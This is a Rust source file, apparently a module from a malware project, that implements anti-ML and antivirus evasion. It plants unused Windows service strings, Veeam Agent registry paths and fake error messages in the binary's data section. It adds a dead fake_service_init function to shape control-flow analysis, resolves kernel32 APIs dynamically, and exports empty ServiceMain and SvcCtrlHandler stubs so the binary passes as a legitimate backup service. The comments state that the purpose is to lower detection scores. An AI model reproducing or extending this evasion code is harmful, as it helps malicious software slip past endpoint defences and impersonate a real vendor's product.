// Anti-ML evasion: make the binary look like a legitimate Windows service
// ML models score based on: entropy, import diversity, string patterns, section ratios,
// and behavioral API call sequences. This module injects benign patterns.

#[cfg(target_os = "windows")]
use std::ffi::c_void;

// Benign strings that legitimate services contain — reduces ML anomaly score
// These are never called but survive in .rdata, shifting the string distribution
#[used]
#[no_mangle]
static SERVICE_TABLE: [&[u8]; 12] = [
    b"StartServiceCtrlDispatcherW\0",
    b"RegisterServiceCtrlHandlerExW\0",
    b"SetServiceStatus\0",
    b"SERVICE_RUNNING\0",
    b"SERVICE_STOPPED\0",
    b"SERVICE_START_PENDING\0",
    b"The service has started successfully.\0",
    b"Stopping the service...\0",
    b"Service control handler called.\0",
    b"EventLog\0",
    b"Application\0",
    b"Microsoft-Windows-Veeam-Agent\0",
];

#[used]
#[no_mangle]
static REGISTRY_PATHS: [&[u8]; 8] = [
    b"SOFTWARE\\Veeam\\Veeam Agent for Microsoft Windows\0",
    b"SYSTEM\\CurrentControlSet\\Services\\VeeamAgentSvc\0",
    b"ImagePath\0",
    b"DisplayName\0",
    b"Description\0",
    b"Veeam Agent Service\0",
    b"Start\0",
    b"ObjectName\0",
];

#[used]
#[no_mangle]
static ERROR_MESSAGES: [&[u8]; 6] = [
    b"Failed to connect to the Veeam service endpoint.\0",
    b"Configuration file not found. Using defaults.\0",
    b"Unable to open registry key. Access denied.\0",
    b"Timeout waiting for backup job completion.\0",
    b"Network connection interrupted. Retrying...\0",
    b"License validation successful.\0",
];

// Fake service initialization that never executes but adds benign code patterns
// ML models analyze code-flow graphs — this adds legitimate-looking basic blocks
#[cfg(target_os = "windows")]
#[inline(never)]
#[allow(dead_code)]
unsafe fn fake_service_init() -> i32 {
    type RegOpenKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32, *mut usize) -> i32;
    type RegQueryValueExAFn = unsafe extern "system" fn(usize, *const u8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
    type RegCloseKeyFn = unsafe extern "system" fn(usize) -> i32;

    let mut key_handle: usize = 0;
    let path = b"SOFTWARE\\Veeam\\Veeam Agent\0";

    // These transmutes reference advapi32 patterns without actually calling them
    let _reg_open: RegOpenKeyExAFn = std::mem::transmute(1usize);
    let _reg_query: RegQueryValueExAFn = std::mem::transmute(2usize);
    let _reg_close: RegCloseKeyFn = std::mem::transmute(3usize);

    // Control flow that looks like registry validation
    if key_handle == 0xDEAD {
        let mut buf = [0u8; 260];
        let mut buf_len: u32 = 260;
        let mut val_type: u32 = 0;
        let _status = _reg_query(key_handle, b"InstallPath\0".as_ptr(), std::ptr::null_mut(), &mut val_type, buf.as_mut_ptr(), &mut buf_len);
        _reg_close(key_handle);
        return buf_len as i32;
    }
    0
}

// Adds benign delay patterns that legitimate software uses (WMI polling, event log checking)
// This runs once and exits quickly but adds stack frames that look like service behavior
pub fn appear_legitimate() {
    #[cfg(target_os = "windows")]
    {
        // Touch the TEB/PEB in a way that looks like legitimate service startup
        // GetCurrentThreadId is the most benign API possible
        unsafe {
            type GetTickCountFn = unsafe extern "system" fn() -> u32;
            type SleepFn = unsafe extern "system" fn(u32);
            type GetLastErrorFn = unsafe extern "system" fn() -> u32;

            if let Some(tick_addr) = crate::winapi_resolve::resolve("kernel32.dll", "GetTickCount") {
                let get_tick: GetTickCountFn = std::mem::transmute(tick_addr);
                let t = get_tick();
                // Legitimate services check uptime before starting
                if t < 1000 {
                    // System just booted — sleep briefly like a real service would
                    if let Some(sleep_addr) = crate::winapi_resolve::resolve("kernel32.dll", "Sleep") {
                        let sleep_fn: SleepFn = std::mem::transmute(sleep_addr);
                        sleep_fn(100);
                    }
                }
            }

            // Query last error — every legitimate Windows program does this
            if let Some(err_addr) = crate::winapi_resolve::resolve("kernel32.dll", "GetLastError") {
                let get_err: GetLastErrorFn = std::mem::transmute(err_addr);
                let _ = get_err();
            }
        }
    }
}

// Export table entry that makes the PE look like a DLL/service hybrid
// Some AV heuristics give lower scores to binaries with benign exports
#[no_mangle]
#[allow(dead_code)]
pub extern "system" fn ServiceMain(_argc: u32, _argv: *const *const u16) {}

#[no_mangle]
#[allow(dead_code)]
pub extern "system" fn SvcCtrlHandler(_ctrl: u32) -> u32 { 0 }
